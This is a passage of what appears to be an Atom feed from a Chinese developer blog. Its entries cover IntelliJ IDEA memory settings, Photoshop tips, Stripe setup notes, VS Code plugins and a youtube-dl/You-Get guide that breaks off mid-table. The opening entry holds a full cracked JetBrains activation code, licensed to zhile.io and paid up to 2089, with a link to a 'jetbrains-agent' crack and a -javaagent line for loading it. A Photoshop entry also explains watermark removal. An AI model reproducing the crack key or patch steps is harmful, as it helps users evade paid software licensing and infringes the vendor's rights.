class="line">3AGXEJXFK9-eyJsaWNlbnNlSWQiOiIzQUdYRUpYRks5IiwibGljZW5zZWVOYW1lIjoiaHR0cHM6Ly96aGlsZS5pbyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IklJIiwiZmFsbGJhY2tEYXRlIjoiMjA4OS0wNy0wNyIsInBhaWRVcFRvIjoiMjA4OS0wNy0wNyJ9LHsiY29kZSI6IkFDIiwiZmFsbGJhY2tEYXRlIjoiMjA4OS0wNy0wNyIsInBhaWRVcFRvIjoiMjA4OS0wNy0wNyJ9LHsiY29kZSI6IkRQTiIsImZhbGxiYWNrRGF0ZSI6IjIwODktMDctMDciLCJwYWlkVXBUbyI6IjIwODktMDctMDcifSx7ImNvZGUiOiJQUyIsImZhbGxiYWNrRGF0ZSI6IjIwODktMDctMDciLCJwYWlkVXBUbyI6IjIwODktMDctMDcifSx7ImNvZGUiOiJHTyIsImZhbGxiYWNrRGF0ZSI6IjIwODktMDctMDciLCJwYWlkVXBUbyI6IjIwODktMDctMDcifSx7ImNvZGUiOiJETSIsImZhbGxiYWNrRGF0ZSI6IjIwODktMDctMDciLCJwYWlkVXBUbyI6IjIwODktMDctMDcifSx7ImNvZGUiOiJDTCIsImZhbGxiYWNrRGF0ZSI6IjIwODktMDctMDciLCJwYWlkVXBUbyI6IjIwODktMDctMDcifSx7ImNvZGUiOiJSUzAiLCJmYWxsYmFja0RhdGUiOiIyMDg5LTA3LTA3IiwicGFpZFVwVG8iOiIyMDg5LTA3LTA3In0seyJjb2RlIjoiUkMiLCJmYWxsYmFja0RhdGUiOiIyMDg5LTA3LTA3IiwicGFpZFVwVG8iOiIyMDg5LTA3LTA3In0seyJjb2RlIjoiUkQiLCJmYWxsYmFja0RhdGUiOiIyMDg5LTA3LTA3IiwicGFpZFVwVG8iOiIyMDg5LTA3LTA3In0seyJjb2RlIjoiUEMiLCJmYWxsYmFja0RhdGUiOiIyMDg5LTA3LTA3IiwicGFpZFVwVG8iOiIyMDg5LTA3LTA3In0seyJjb2RlIjoiUk0iLCJmYWxsYmFja0RhdGUiOiIyMDg5LTA3LTA3IiwicGFpZFVwVG8iOiIyMDg5LTA3LTA3In0seyJjb2RlIjoiV1MiLCJmYWxsYmFja0RhdGUiOiIyMDg5LTA3LTA3IiwicGFpZFVwVG8iOiIyMDg5LTA3LTA3In0seyJjb2RlIjoiREIiLCJmYWxsYmFja0RhdGUiOiIyMDg5LTA3LTA3IiwicGFpZFVwVG8iOiIyMDg5LTA3LTA3In0seyJjb2RlIjoiREMiLCJmYWxsYmFja0RhdGUiOiIyMDg5LTA3LTA3IiwicGFpZFVwVG8iOiIyMDg5LTA3LTA3In0seyJjb2RlIjoiUlNVIiwiZmFsbGJhY2tEYXRlIjoiMjA4OS0wNy0wNyIsInBhaWRVcFRvIjoiMjA4OS0wNy0wNyJ9XSwiaGFzaCI6IjEyNzk2ODc3LzAiLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0&#x3D;-WGTHs6XpDhr+uumvbwQPOdlxWnQwgnGaL4eRnlpGKApEEkJyYvNEuPWBSrQkPmVpim&#x2F;8Sab6HV04Dw3IzkJT0yTc29sPEXBf69+7y6Jv718FaJu4MWfsAk&#x2F;ZGtNIUOczUQ0iGKKnSSsfQ&#x2F;3UoMv0q&#x2F;yJcfvj+me5Zd&#x2F;gfaisCCMUaGjB&#x2F;lWIPpEPzblDtVJbRexB1MALrLCEoDv3ujcPAZ7xWb54DiZwjYhQvQ+CvpNNF2jeTku7lbm5v+BoDsdeRq7YBt9ANLUKPr2DahcaZ4gctpHZXhG96IyKx232jYq9jQrFDbQMtVr3E+GsCekMEWSD&#x2F;&#x2F;dLT+HuZdc1sAIYrw&#x3D;&#x3D;-MIIElTCCAn2gAwIBAgIBCTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE4MTEwMTEyMjk0NloXDTIwMTEwMjEyMjk0NlowaDELMAkGA1UEBhMCQ1oxDjAMBgNVBAgMBU51c2xlMQ8wDQYDVQQHDAZQcmFndWUxGTAXBgNVBAoMEEpldEJyYWlucyBzLnIuby4xHTAbBgNVBAMMFHByb2QzeS1mcm9tLTIwMTgxMTAxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5ndaik1GD0nyTdqkZgURQZGW+RGxCdBITPXIwpjhhaD0SXGa4XSZBEBoiPdY6XV6pOfUJeyfi9dXsY4MmT0D+sKoST3rSw96xaf9FXPvOjn4prMTdj3Ji3CyQrGWeQU2nzYqFrp1QYNLAbaViHRKuJrYHI6GCvqCbJe0LQ8qqUiVMA9wG&#x2F;PQwScpNmTF9Kp2Iej+Z5OUxF33zzm+vg&#x2F;nYV31HLF7fJUAplI&#x2F;1nM+ZG8K+AXWgYKChtknl3sW9PCQa3a3imPL9GVToUNxc0wcuTil8mqveWcSQCHYxsIaUajWLpFzoO2AhK4mfYBSStAqEjoXRTuj17mo8Q6M2SHOcwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl&#x2F;GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQBonMu8oa3vmNAa4RQP8gPGlX3SQaA3WCRUAj6Zrlk8AesKV1YSkh5D2l+yUk6njysgzfr1bIR5xF8eup5xXc4&#x2F;G7NtVYRSMvrd6rfQcHOyK5UFJLm+8utmyMIDrZOzLQuTsT8NxFpbCVCfV5wNRu4rChrCuArYVGaKbmp9ymkw1PU6+HoO5i2wU3ikTmRv8IRjrlSStyNzXpnPTwt7bja19ousk56r40SmlmC04GdDHErr0ei2UbjUua5kw71Qn9g02tL9fERI2sSRjQrvPbn9INwRWl5+k05mlKekbtbu2ev2woJFZK4WEXAd&#x2F;GaAdeZZdumv8T2idDFL7cAirJwcrbfpawPeXr52oKTPnXfi0l5+g9Gnt&#x2F;wfiXCrPElX6ycTR6iL3GC2VR4jTz6YatT4Ntz59&#x2F;THOT7NJQhr6AyLkhhJCdkzE2cob&#x2F;KouVp4ivV7Q3Fc6HX7eepHAAF&#x2F;DpxwgOrg9smX6coXLgfp0b1RU2u&#x2F;tUNID04rpNxTMueTtrT8WSskqvaJd3RH8r7cnRj6Y2hltkja82HlpDURDxDTRvv+krbwMr26SB&#x2F;40BjpMUrDRCeKuiBahC0DCoU&#x2F;4+ze1l94wVUhdkCfL0GpJrMSCDEK+XEurU18Hb7WT+ThXbkdl6VpFdHsRvqAnhR2g4b+Qzgidmuky5NUZVfEaZqV&#x2F;g&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>更新最新的破解补丁文档2020/03/10:<a href="https://zhile.io/2018/08/17/jetbrains-license-server-crack.html" target="_blank" rel="noopener"> jetbrains-agent 一手更新</a></p><p>更新到最新显示版本：2019.3.3 ，截至时间为： 2020年3月8日。<del>参考文档<a href="https://segmentfault.com/a/1190000021914963" target="_blank" rel="noopener">IntelliJ IDEA 2019.3.3补丁失效问题</a></del>。其实网上大多的补丁只要1353kb,而最新的却有2.1m</p><blockquote><p>切记通过启动idea进行修改参数,不要直接修改idea64.exe.文件，在vmoptions文件增加如下参数（绝对路径）:</p></blockquote><p>-javaagent:E:\ProgramFiles\JetBrains\IntelliJIDEA2019.2.1\bin\jetbrains-agent.jar</p><h2 id="idea占用内存太高"><a href="#idea占用内存太高" class="headerlink" title="idea占用内存太高"></a>idea占用内存太高</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://blog.csdn.net/zzzgd_666/article/details/81126822" target="_blank" rel="noopener">https://blog.csdn.net/zzzgd_666/article/details/81126822</a></li></ol><ul><li>首先修改和idea64.exe文件同目录的idea64.exe.vmoptions文件（32位的文件名为idea.exe.vmoptions），开启server模式并加大最大内存，内容如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># custom IntelliJ IDEA VM options</span><br><span class="line">-server</span><br><span class="line">-Xms1825m</span><br><span class="line">-Xmx1825m</span><br><span class="line">-XX:ReservedCodeCacheSize&#x3D;240m</span><br><span class="line">-XX:+UseConcMarkSweepGC</span><br><span class="line">-XX:SoftRefLRUPolicyMSPerMB&#x3D;50</span><br><span class="line">-ea</span><br><span class="line">-Dsun.io.useCanonCaches&#x3D;false</span><br><span class="line">-Djava.net.preferIPv4Stack&#x3D;true</span><br><span class="line">-Djdk.http.auth.tunneling.disabledSchemes&#x3D;&quot;&quot;</span><br><span class="line">-XX:+HeapDumpOnOutOfMemoryError</span><br><span class="line">-XX:-OmitStackTraceInFastThrow</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>点击 File -&gt; Invalidate Caches / Restart…菜单，然后点击 Invalidate and Restart按钮清空并重建索引，然后重启。再次启动程序之后，会首先重建索引和缓存。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;体验是很好，唯一的就是很耗内存，所以设置了堆的最大空间为如下,体验上还行，没有出现特别耗内存的情况：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>PhotoShop CC 2018工具使用技巧</title>
    <link href="https://seniortesting.club/posts/fBWMmTZwnA/"/>
    <id>https://seniortesting.club/posts/fBWMmTZwnA/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>JPEG 2000, JPEG XR, and WebP are image formats that have superior compression and quality characteristics compared to their older JPEG and PNG counterparts. Encoding your images in these formats rather than JPEG or PNG means that they will load faster and consume less cellular data.</p><h3 id="图片尺寸如何放大缩小"><a href="#图片尺寸如何放大缩小" class="headerlink" title="图片尺寸如何放大缩小?"></a><del>图片尺寸如何放大缩小?</del></h3><ul><li>打开PS,打开对应的你需要调整的图片文件</li><li>选择菜单 <code>导出</code>-&gt; ‘导出为..’,调整长度和宽度为自己需要的</li></ul><p>见下图截图：</p><p><img src="./img/ps-resize.png" alt="ps-resize"></p><h3 id="图片如何压缩大小？"><a href="#图片如何压缩大小？" class="headerlink" title="图片如何压缩大小？"></a>图片如何压缩大小？</h3><ol><li>在ps中打开图片</li><li>选择“文件”-》“导出。。。”-》“存储为Web所用格式。。。”<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200313213655.png" alt="20200313213655.png"></li><li>然后在弹出的对话框中“预设”选择“JPEG 低”，然后调整“品质”此参数可以调整到对应的大小。<br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20200313214036.png" alt="20200313214036.png"><h3 id="图片拼接，图片裁剪"><a href="#图片拼接，图片裁剪" class="headerlink" title="图片拼接，图片裁剪"></a>图片拼接，图片裁剪</h3></li></ol><ul><li><p>在ps中分别打开两张需要拼接的图片，然后在其中一张图片选框工具，选择一个分区，然后保存该图层（菜单图层-&gt;新建-&gt;通过拷贝的图层 CTRL+J)</p></li><li><p>拖动第一张图片的图层到第二张需要拼接的图片上，然后调整拖动过来的图层的大小（编辑-&gt;自由变换 CTRL+T)</p></li><li><p>自由变换该图层直到可以覆盖原图，然后保存即可</p></li></ul><h3 id="图片颜色提取？"><a href="#图片颜色提取？" class="headerlink" title="图片颜色提取？"></a>图片颜色提取？</h3><ol><li>ps中打开图片</li><li>采用吸管工具，然后点击颜色区域，可以查看到颜色hex值；</li></ol><h3 id="图片字体复制"><a href="#图片字体复制" class="headerlink" title="图片字体复制"></a>图片字体复制</h3><p><a href="https://jingyan.baidu.com/article/c74d6000c899e20f6a595de6.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/c74d6000c899e20f6a595de6.html</a></p><ol><li>首先用仿制公章将字体部分覆盖删除掉</li><li>使用文字工具写上你需要添加的字，然后鼠标指针选中添加的字体调整它的大小样式</li></ol><h3 id="如何去除水印"><a href="#如何去除水印" class="headerlink" title="如何去除水印"></a>如何去除水印</h3><ol><li>采用锁套工具或者矩形选择工具，然后右键选择的区域，选择“填充”</li><li>在弹出的填充对话框中，内容选择“内容识别”，模式“正常”，不透明度“100%”点击确认即可；</li></ol><p>参考视频: <a href="https://www.youtube.com/watch?v=ZqJzWIt7hZc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=ZqJzWIt7hZc</a></p><h3 id="图片合并，抠图"><a href="#图片合并，抠图" class="headerlink" title="图片合并，抠图"></a>图片合并，抠图</h3><ol><li>分别打开两张图片</li><li>在其中一个图片上选择，图层-》新建-》 通过拷贝的图层 或者快捷键CTRL +J</li><li>在右边选择刚刚拷贝的图层，拖动到第二个图片上</li><li>设置第二个图片的画布大小，图像-》画布大小。。。</li><li>在左边工具栏，选择移动工具，拖动图层到合适位置</li><li>可以使用不同的选框工具，对图片进行裁剪，还是CTRL+J</li><li>将左边的不同图层或者背景前面的小眼睛勾选掉，代表可见性，如果不勾选就可以看到你需要的图层。保存就好了</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;技巧&quot;&gt;&lt;a href=&quot;#技巧&quot; class=&quot;headerlink&quot; title=&quot;技巧&quot;&gt;&lt;/a&gt;技巧&lt;/h2&gt;&lt;p&gt;JPEG 2000, JPEG XR, and WebP are image formats that have superior comp</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>stripe 支付配置流程</title>
    <link href="https://seniortesting.club/posts/XpmCuBQHFS/"/>
    <id>https://seniortesting.club/posts/XpmCuBQHFS/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="stripe-支付配置流程"><a href="#stripe-支付配置流程" class="headerlink" title="stripe 支付配置流程"></a>stripe 支付配置流程</h2><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ol><li>如何快速对接Stripe国际支付系统：<a href="https://juejin.im/post/5e6c99166fb9a07ca90c4352" target="_blank" rel="noopener">https://juejin.im/post/5e6c99166fb9a07ca90c4352</a></li><li>如何注册账号： <a href="http://www.136936.com/article-2334-1.html" target="_blank" rel="noopener">http://www.136936.com/article-2334-1.html</a></li></ol><h3 id="问题整理"><a href="#问题整理" class="headerlink" title="问题整理"></a>问题整理</h3><ol><li>Error: No signatures found matching the expected signature for payload. Are you passing the raw request body you received from Stripe? <a href="https://github.com/stripe/stripe-node#webhook-signing" target="_blank" rel="noopener">https://github.com/stripe/stripe-node#webhook-signing</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;stripe-支付配置流程&quot;&gt;&lt;a href=&quot;#stripe-支付配置流程&quot; class=&quot;headerlink&quot; title=&quot;stripe 支付配置流程&quot;&gt;&lt;/a&gt;stripe 支付配置流程&lt;/h2&gt;&lt;h3 id=&quot;参考文档&quot;&gt;&lt;a href=&quot;#参考文档&quot;</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>Visual Studio Code工具使用技巧</title>
    <link href="https://seniortesting.club/posts/0499MKw0IA/"/>
    <id>https://seniortesting.club/posts/0499MKw0IA/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>发现flutter居然官方也提供了vscode的IDE支持，看来vscode想要成为宇宙第一神器的节奏。。。</p></blockquote><h2 id="插件推荐"><a href="#插件推荐" class="headerlink" title="插件推荐"></a>插件推荐</h2><h3 id="1-markdown-all-in-one"><a href="#1-markdown-all-in-one" class="headerlink" title="1. markdown-all-in-one"></a><del>1. markdown-all-in-one</del></h3><blockquote><p>在所有拓展插件中，这个插件基础功能最全，快捷键多，方便使用。使用下方的Markdown Shortcuts代替</p></blockquote><h3 id="2-Markdown-Preview-Enhanced"><a href="#2-Markdown-Preview-Enhanced" class="headerlink" title="2. Markdown Preview Enhanced"></a>2. Markdown Preview Enhanced</h3><blockquote><p>增强的预览插件</p></blockquote><h3 id="3-markdownlint"><a href="#3-markdownlint" class="headerlink" title="3. markdownlint"></a>3. markdownlint</h3><blockquote><p>规范语法规则的</p></blockquote><h3 id="4-Markdown-Shortcuts"><a href="#4-Markdown-Shortcuts" class="headerlink" title="4. Markdown Shortcuts"></a>4. Markdown Shortcuts</h3><blockquote><p>这个插件就很强大了，有时候从表里复制过来数据，总不能一个一个的|加吧，所以这个插件帮我们解决复制表格的问题。<br>右键选择功能</p></blockquote><h2 id="5-Markdown-PDF"><a href="#5-Markdown-PDF" class="headerlink" title="5. Markdown PDF"></a>5. Markdown PDF</h2><blockquote><p>转换markdown为pdf，html,png文件</p></blockquote><p>使用方法：<strong>右键导出markdown文件功能</strong></p><h2 id="6-图床工具"><a href="#6-图床工具" class="headerlink" title="6. 图床工具"></a>6. 图床工具</h2><blockquote><p>picgo</p></blockquote><p><del>(暂不支持vscode的gitee插件)如何配置支持在gitee中新建一个图片仓库。</del><br>采用Github作为仓库，访问github的<a href="https://github.com/settings/apps" target="_blank" rel="noopener">Settings Developer settings</a>,新建：<strong>Personal access tokens</strong>，参考配置页： <a href="https://picgo.github.io/PicGo-Doc/zh/guide/config.html#github%E5%9B%BE%E5%BA%8A" target="_blank" rel="noopener">Github图床配置</a><br><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/IMG6.jpg" alt="IMG6.jpg"></p><h2 id="7-markdown-math"><a href="#7-markdown-math" class="headerlink" title="7. markdown+math"></a>7. markdown+math</h2><blockquote><p>数学公式工具</p></blockquote><h2 id="8-语法高亮插件"><a href="#8-语法高亮插件" class="headerlink" title="8. 语法高亮插件"></a>8. 语法高亮插件</h2><blockquote><p><a href="https://github.com/highlightjs/highlight.js" target="_blank" rel="noopener">highlight.js</a>,<br>不同的CSS高亮样式参考:<a href="https://github.com/highlightjs/highlight.js/blob/master/src/styles/atom-one-dark-reasonable.css" target="_blank" rel="noopener">样式参考</a></p></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>待整理</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;发现flutter居然官方也提供了vscode的IDE支持，看来vscode想要成为宇宙第一神器的节奏。。。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;插件推荐&quot;&gt;&lt;a href=&quot;#插件推荐&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>youtube-dl视频下载神器</title>
    <link href="https://seniortesting.club/posts/mAR5UoRSwG/"/>
    <id>https://seniortesting.club/posts/mAR5UoRSwG/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>youtube-dl 是一个命令行工具，对我所知的大部分视频网站有不错的支持，你可以选择下载视频，或是将视频流直接导出到自己想使用的播放器中，也可以以JSON的形式获取可下载资源的URL。</p><p>使用方便、足够简洁，这是我在这里推荐的理由。</p><p>youtube-dl 的 GitHub 页面：<a href="https://github.com/rg3/youtube-dl%EF%BC%88%E5%96%9C%E6%AC%A2%E7%9A%84%E8%AF%9D%E7%BB%99%E4%BD%9C%E8%80%85star%E5%93%A6~%EF%BC%89" target="_blank" rel="noopener">https://github.com/rg3/youtube-dl（喜欢的话给作者star哦~）</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>window用户：</li></ul><ol><li>下载文件<a href="https://yt-dl.org/latest/youtube-dl.exe" target="_blank" rel="noopener">youtube-dl.exe</a>。</li><li>下载对应的ffmpeg.exe将youtube-dl.exe放到ffmpeg的bin目录下面，ffmpeg官网：<a href="http://ffmpeg.org/" target="_blank" rel="noopener">http://ffmpeg.org/</a></li><li>配置环境变量切换到ffmpeg的bin目录</li></ol><ul><li>Linux用户：</li></ul><ol><li>因为是python开发的所以直接安装对应的python包： <code>sudo -H pip install --upgrade youtube-dl</code></li><li>下载对应的ffmpeg包,访问官网: <a href="http://ffmpeg.org/,%E4%B8%8B%E8%BD%BD%E5%AF%B9%E5%BA%94%E7%9A%84debian%E7%9A%84deb%E5%8C%85%EF%BC%9A%60https://tracker.debian.org/pkg/ffmpeg%60%EF%BC%8C%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9A" target="_blank" rel="noopener">http://ffmpeg.org/,下载对应的debian的deb包：`https://tracker.debian.org/pkg/ffmpeg`，命令行：</a></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install ffmpeg</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ffmpeg -version</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo -H pip install --upgrade youtube-dl</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="命令参考"><a href="#命令参考" class="headerlink" title="命令参考"></a>命令参考</h2><p>参数： <code>--ffmpeg-location </code>可以用来设置ffmpeg的路径，可以是可执行文件路径或者对应的执行文件路径的文件夹</p><h3 id="普通下载"><a href="#普通下载" class="headerlink" title="普通下载"></a>普通下载</h3><p>通过 Youtube-dl 下载视频十分简洁，例如你需要下载哔哩哔哩视频：<code>http://www.bilibili.com/video/av11728123/</code> 你可以这样：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">youtube-dl <span class="string">&#x27;http://www.bilibili.com/video/av11728123/&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="下载最好的音视频格式"><a href="#下载最好的音视频格式" class="headerlink" title="下载最好的音视频格式"></a>下载最好的音视频格式</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">会显示不同的格式和质量的视频,然后执行下方命令下载你需要的质量视频</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> youtube-dl -F https://www.youtube.com/watch?v=zbGZufWXJDA</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> youtube-dl -f 22 https://www.youtube.com/watch?v=zbGZufWXJDA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如下命令会下载质量最好的视频和音频并保存为mp4文件</span></span><br><span class="line">youtube-dl -f &#x27;bestvideo[ext=mp4]+bestaudio[ext=m4a]/bestvideo+bestaudio&#x27; --merge-output-format mp4  https://www.youtube.com/watch?v=zbGZufWXJDA</span><br></pre></td></tr></table></figure><h3 id="输出文件的名字"><a href="#输出文件的名字" class="headerlink" title="输出文件的名字"></a>输出文件的名字</h3><p>如果你想指定下载输出文件的名字（有时对批量下载的人来说十分重要），你可以使用<code>-o</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载至文件：你要的名字 (无后缀)</span></span><br><span class="line">youtube-dl &#x27;http://www.bilibili.com/video/av11728123/&#x27; -o &#x27;你要的名字&#x27;</span><br></pre></td></tr></table></figure><p>当然，请注意你选择的名字的拓展名，youtube-dl 并不会自动修改你所指定的后缀名。youtube-dl 同时也支持 OUTPUT TEMPLATE，你可以利用 <code>%(title)s</code>等参数（参考 Python 的字符串形式）将文件命名，例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载至文件：【全明星freestyle】音浪.mp4</span></span><br><span class="line">youtube-dl &#x27;http://www.bilibili.com/video/av11728123/&#x27; -o &#x27;%(title)s.%(ext)s&#x27;</span><br></pre></td></tr></table></figure><h3 id="使用代理下载"><a href="#使用代理下载" class="headerlink" title="使用代理下载"></a>使用代理下载</h3><p>有时候不能下载youtube视频，你可以尝试使用你的代理进行通信。youtube-dl 提供了使用代理的参数，你可以简单地将自己代理的地址填入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 成功通过ss在国内下载某不存在网站的视频</span></span><br><span class="line">youtube-dl --proxy 127.0.0.1:1087 &#x27;https://www.youtube.com/watch\?v\=_fc_TLg3eQ4&#x27;</span><br></pre></td></tr></table></figure><h3 id="其他下载选项"><a href="#其他下载选项" class="headerlink" title="其他下载选项"></a>其他下载选项</h3><p>youtube-dl 还提供很多其他的下载选项，如挑选合适的分辨率，下载一个播放列表等，你可以研究并自定义如何下载一个文件。</p><h2 id="国内版的youtube-dl：You-Get"><a href="#国内版的youtube-dl：You-Get" class="headerlink" title="国内版的youtube-dl：You-Get"></a>国内版的youtube-dl：You-Get</h2><p>2020/08/15更新: 作者又开始重新更新维护这个工具了，大家可以放心使用了！</p><p>You-Get的GitHub地址：<a href="https://github.com/soimort/you-get" target="_blank" rel="noopener">https://github.com/soimort/you-get</a></p><p>事实上而言，我发现You-Get对国内视频音乐网站的支持更加全面。但是如果你遇到无法使用<code>youtube-dl</code>下载的视频页面，不妨试试这个同类小工具。支持的国内国外音视频网站如下：</p><h2 id="Supported-Sites"><a href="#Supported-Sites" class="headerlink" title="Supported Sites"></a>Supported Sites</h2><table><thead><tr><th align="center">Site</th><th align="left">URL</th><th align="center">Videos?</th><th align="center">Images?</th><th align="center">Audios?</th></tr></thead><tbody><tr><td align="center"><strong>YouTube</strong></td><td align="left"><a href="https://www.youtube.com/" target="_blank" rel="noopener">https://www.youtube.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>Twitter</strong></td><td align="left"><a href="https://twitter.com/" target="_blank" rel="noopener">https://twitter.com/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center">VK</td><td align="left"><a href="http://vk.com/" target="_blank" rel="noopener">http://vk.com/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center">Vine</td><td align="left"><a href="https://vine.co/" target="_blank" rel="noopener">https://vine.co/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Vimeo</td><td align="left"><a href="https://vimeo.com/" target="_blank" rel="noopener">https://vimeo.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Veoh</td><td align="left"><a href="http://www.veoh.com/" target="_blank" rel="noopener">http://www.veoh.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>Tumblr</strong></td><td align="left"><a href="https://www.tumblr.com/" target="_blank" rel="noopener">https://www.tumblr.com/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr><tr><td align="center">TED</td><td align="left"><a href="http://www.ted.com/" target="_blank" rel="noopener">http://www.ted.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">SoundCloud</td><td align="left"><a href="https://soundcloud.com/" target="_blank" rel="noopener">https://soundcloud.com/</a></td><td align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">SHOWROOM</td><td align="left"><a href="https://www.showroom-live.com/" target="_blank" rel="noopener">https://www.showroom-live.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Pinterest</td><td align="left"><a href="https://www.pinterest.com/" target="_blank" rel="noopener">https://www.pinterest.com/</a></td><td align="center"></td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center">MTV81</td><td align="left"><a href="http://www.mtv81.com/" target="_blank" rel="noopener">http://www.mtv81.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Mixcloud</td><td align="left"><a href="https://www.mixcloud.com/" target="_blank" rel="noopener">https://www.mixcloud.com/</a></td><td 